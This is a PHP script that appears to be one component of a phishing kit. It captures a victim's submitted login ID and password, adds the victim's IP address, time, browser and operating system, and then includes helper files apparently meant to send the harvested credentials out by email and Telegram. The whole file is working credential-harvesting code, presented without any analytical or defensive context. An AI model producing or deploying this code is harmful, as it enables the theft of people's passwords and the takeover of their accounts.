<?php
session_start();

include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$iduserLoginId = $_SESSION['iduserLoginId'] = $_POST['iduserLoginId'];

$idpassword = $_SESSION['idpassword'] = $_POST['idpassword'];




$yagmai .= '
[👤 Login] = '.$_SESSION['iduserLoginId'].'
[🔓 Password] = '.$_SESSION['idpassword'].'
       [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
';




include("sand_email.php"); 
include("Add_Your_TelegramAPi.php");





?>